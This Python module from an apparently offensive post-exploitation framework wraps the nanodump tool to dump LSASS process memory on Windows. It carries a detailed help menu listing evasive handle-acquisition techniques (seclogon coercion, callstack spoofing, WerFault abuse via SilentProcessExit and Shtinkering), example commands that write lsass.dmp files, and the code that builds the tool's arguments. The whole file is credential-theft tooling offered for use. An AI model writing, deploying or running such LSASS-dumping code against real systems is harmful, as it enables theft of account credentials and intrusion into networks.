import base64
import argparse
from typing import List

# BOF imports
from core.gunnershell.bofs.base import Bof, register

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
reset = Style.RESET_ALL

@register("nanodump")
class NanoDumpBof(Bof):
	base64bof: str = ""

	def help_menu():
		menu = """
nanodump — Dumps LSASS with syscalls
-------------------------------

Description
  Acquire an LSASS memory dump using several handle-acquisition strategies.
  Supports forking or snapshotting the target, optional “valid-signature”
  dumps, and a PID-only mode for discovery. 64-bit only, requires Admin.

Usage
  nanodump [options]
  nanodump --getpid
  nanodump --pid <PID> [acquisition options] [-w <path>] [--valid] [--fork|--snapshot]

Core Output
  -w, DUMP_PATH            Write dump to this file (e.g., C:\\Windows\\Temp\\lsass.dmp)
  --valid                  Create a dump with a valid signature (best-effort)

Target Selection
  --getpid                 Print the PID of LSASS and exit (must be used alone)
  --pid PID                Target LSASS by PID (otherwise autodetect)

Acquisition Modes (choose one)
  -d                       Duplicate: use a high-privileged existing LSASS handle
  -de                      Duplicate-elevate: use a low-privileged LSASS handle, then elevate it
  -sd                      Seclogon-duplicate: coerce seclogon to open LSASS, then duplicate
  -sc                      Spoof-callstack: open LSASS using a fake call stack
  -slr SLR_BIN_PATH        Seclogon-leak-remote: leak LSASS handle into another process, then duplicate
  -spe SPE_DUMP_FOLDER     Silent-process-exit: use WerFault via SilentProcessExit to dump LSASS (used alone)
  -sk                      Shtinkering (SYSTEM): force WerFault.exe to dump LSASS (cannot combine with file output)

Stabilization
  --fork                   Fork the target process before dumping
  --snapshot               Snapshot the target process before dumping

Validation & Constraints
  • --getpid must be used by itself (no other options).
  • -spe must be used by itself (no other options).
  • -sk cannot be combined with --fork, --snapshot, --valid, or -w.
  • Mutual exclusions (any pair listed is invalid together):
      -d  with  -eh, -sc, -sd, -slr
      -de with  -sc, -sd, -slr, -d, -eh
      -eh with  -de, -sd
      -sd with  -d, -de, -eh, -sc, -slr
      -sc with  -d, -de, -sd, -slr
      -slr with -d, -de, -eh, -sd, -sc
  • 64-bit only (WoW64 not supported). Requires Administrator.

Examples
  # Discover LSASS PID only
  nanodump --getpid

  # Snapshot LSASS and write a dump
  nanodump --pid 648 --snapshot -w C:\\Windows\\Temp\\lsass.dmp

  # Use seclogon-duplicate to obtain a handle, then dump with a valid signature
  nanodump -sd --pid 648 -w C:\\Temp\\lsass_valid.dmp --valid

  # Trigger WerFault via SilentProcessExit (no other options)
  nanodump -spe C:\\Temp

Notes
  • Some modes depend on existing handles in other processes.
  • Ensure you have explicit authorization to perform memory acquisition on the target.
"""
		print(brightgreen + menu + reset)
		return

	@staticmethod
	def args_inject(p):
		#Core Output
		p.add_argument("-w", dest="dump_path", default="C:\\Windows\\Temp\\gunner.dmp", help="Filename of the dump")
		p.add_argument("--valid", dest="valid", default=False, action="store_true", help="Create a dump with a valid signature")

		#Target Selection
		p.add_argument("--getpid", dest="getpid", default=False, help="Print the PID of LSASS and leave")
		p.add_argument("--pid", dest="pid", default="", help="PID of LSASS")

		#Acquisition Modes
		p.add_argument("-d", dest="dup", default=False, action="store_true", help="Duplicate: a high privileged existing LSASS handle")
		p.add_argument("-de", dest="dupe", default=False, action="store_true", help="Duplicate-elevate: use a low-privileged LSASS handle, then elevate it")
		p.add_argument("-eh", dest="elevate_handle", default=False, action="store_true", help="Elevate-handle: open a handle to LSASS with low privileges and duplicate it to gain higher privileges")
		p.add_argument("-sd", dest="secdup", default=False, action="store_true", help="Seclogon-duplicate: coerce seclogon to open LSASS, then duplicate")
		p.add_argument("-sc", dest="spoofcallstack", default=False, action="store_true", help="Spoof-callstack: open LSASS using a fake call stack")
		p.add_argument("-slr", dest="seclogon_leak", default="", help="Seclogon-leak-remote: leak LSASS handle into another process, then duplicate")
		p.add_argument("-spe", dest="slient_process_exit", default="", help="Silent-process-exit: use WerFault via SilentProcessExit to dump LSASS (used alone)")
		p.add_argument("-sk", dest="shtinkering", default=False, action="store_true", help="Shtinkering (SYSTEM): force WerFault.exe to dump LSASS (cannot combine with file output)")

		#Stabilization
		p.add_argument("--fork", dest="fork", default=False, action="store_true", help="Fork the target process before dumping")
		p.add_argument("--snapshot", dest="snapshot", default=False, action="store_true", help="Snapshot the target process before dumping")
		return

	@staticmethod
	def build_remote_args(ns):
		if ns.getpid and any([ns.dump_path, ns.valid, ns.pid, ns.dup, ns.dupe, ns.secdup, ns.spoofcallstack, ns.seclogon_leak, ns.slient_process_exit, ns.shtinkering,
			ns.fork, ns.snapshot]):
			print(brightyellow + "The parameter --getpid is used alone" + reset)
			return

		if ns.slient_process_exit and any([ns.dump_path, ns.valid, ns.getpid, ns.pid, ns.dup, ns.dupe, ns.secdup, ns.spoofcallstack, ns.seclogon_leak, ns.shtinkering,
			ns.fork, ns.snapshot]):
			print(brightyellow + "The parameter -spe is used alone" + reset)
			return

		if ns.dup and ns.elevate_handle:
			print(brightyellow + "The options -d and -eh cannot be used together" + reset)
			return

		if ns.dupe and ns.spoofcallstack:
			print(brightyellow + "The options -de and -sc cannot be used together" + reset)
			return

		if ns.dup and ns.spoofcallstack:
			print(brightyellow + "The options -d and -sc cannot be used together" + reset)
			return

		if ns.dupe and ns.secdup:
			print(brightyellow + "The options -d and -sd cannot be used together" + reset)
			return

		if ns.elevate_handle and ns.dupe:
			print(brightyellow + "The options -eh and -de cannot be used together" + reset)
			return

		if ns.dupe and ns.dup:
			print(brightyellow + "The options -de and -d cannot be used together" + reset)
			return

		if ns.dupe and ns.secdup:
			print(brightyellow + "The options -de and -sd cannot be used together" + reset)
			return

		if ns.elevate_handle and ns.secdup:
			print(brightyellow + "The options -eh and -sd cannot be used together" + reset)
			return

		if ns.dup and ns.seclogon_leak:
			print(brightyellow + "The options -d and -slr cannot be used together" + reset)
			return

		if ns.dupe and ns.seclogon_leak:
			print(brightyellow + "The options -de and -slr cannot be used together" + reset)
			return

		if ns.elevate_handle and ns.seclogon_leak:
			print(brightyellow + "The options --eh and -slr cannot be used together" + reset)
			return

		if ns.seclogon_leak and ns.secdup:
			print(brightyellow + "The options -slr and -sd cannot be used together" + reset)
			return

		if ns.seclogon_leak and ns.spoofcallstack:
			print(brightyellow + "The options -slr and -sc cannot be used together" + reset)
			return

		if ns.secdup and ns.spoofcallstack:
			print(brightyellow + "The options -sd and -sc cannot be used together" + reset)
			return

		if ns.shtinkering and ns.fork:
			print(brightyellow + "The options -sk and --fork cannot be used together" + reset)
			return

		if ns.shtinkering and ns.snapshot:
			print(brightyellow + "The options -sk and --snapshot cannot be used together" + reset)
			return

		if ns.shtinkering and ns.valid:
			print(brightyellow + "The options -sk and --valid cannot be used together" + reset)
			return

		if ns.shtinkering and ns.dump_path:
			print(brightyellow + "The options -sk and -w cannot be used together" + reset)
			return

		pid = ns.pid if ns.pid else 0
		dump_path = ns.dump_path
		write_file = 1
		chunk_size = 0xe1000
		use_valid_sig = 1 if ns.valid else 0
		fork = 1 if ns.fork else 0
		snapshot = 1 if ns.snapshot else 0
		dup = 1 if ns.dup else 0
		elevate_handle = 1 if ns.elevate_handle else 0
		duplicate_elevate = 1 if ns.dupe else 0
		get_pid = 1 if ns.getpid else 0
		use_seclogon_leak_local = 0
		use_seclogon_leak_remote = 1 if ns.seclogon_leak else 0
		seclogon_leak_remote_binary = ns.seclogon_leak
		use_seclogon_duplicate = 1 if ns.secdup else 0
		spoof_callstack = 1 if ns.spoofcallstack else 0
		use_silent_process_exit = 1 if ns.slient_process_exit else 0
		silent_process_exit = ns.slient_process_exit
		use_lsass_shtinkering = 1 if ns.shtinkering else 0

		return [
			f"-i:{pid}",
			f"-z:{dump_path}",
			f"-i:{write_file}",
			f"-i:{chunk_size}",
			f"-i:{use_valid_sig}",
			f"-i:{fork}",
			f"-i:{snapshot}",
			f"-i:{dup}",
			f"-i:{elevate_handle}",
			f"-i:{duplicate_elevate}",
			f"-i:{get_pid}",
			f"-i:{use_seclogon_leak_local}",
			f"-i:{use_seclogon_leak_remote}",
			f"-z:{seclogon_leak_remote_binary}",
			f"-i:{use_seclogon_duplicate}",
			f"-i:{spoof_callstack}",
			f"-i:{use_silent_process_exit}",
			f"-z:{silent_process_exit}",
			f"-i:{use_lsass_shtinkering}",
		]










